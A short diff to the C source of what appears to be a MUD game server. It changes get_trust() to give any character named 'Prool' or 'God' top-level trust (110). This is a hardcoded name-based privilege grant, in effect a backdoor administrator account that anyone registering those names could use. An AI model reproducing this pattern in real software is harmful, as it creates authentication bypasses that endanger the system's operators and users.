@@ -505,6 +505,8 @@ void reset_char(CHAR_DATA *ch)
 int get_trust( CHAR_DATA *ch )
 {
   if (IS_NPC(ch)) return 101;
+  if (!strcmp(ch->name,"Prool")) return 110; // prool is god
+  if (!strcmp(ch->name,"God")) return 110; // god is god
   return UMAX(ch->level,ch->trust);
 }
 
